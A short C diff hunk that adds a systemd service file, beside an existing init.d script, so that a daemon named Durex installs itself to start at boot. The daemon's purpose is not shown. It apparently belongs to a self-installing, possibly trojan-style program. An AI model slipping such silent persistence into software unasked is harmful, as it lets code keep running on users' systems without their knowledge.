@@ -23,6 +23,7 @@ static void	install_daemon_kernel_runtime(void)
 	// if (file_exists("/etc/init.d") == false)
 	// 	mkdir("/etc/init.d", 0700);
 	file_put_contents("/etc/init.d/Durex", (char*)daemon_init);
+	file_put_contents("/etc/systemd/system/Durex.service", (char*)daemon_init_systemd);
 }
 
 void		daemon_install(void)
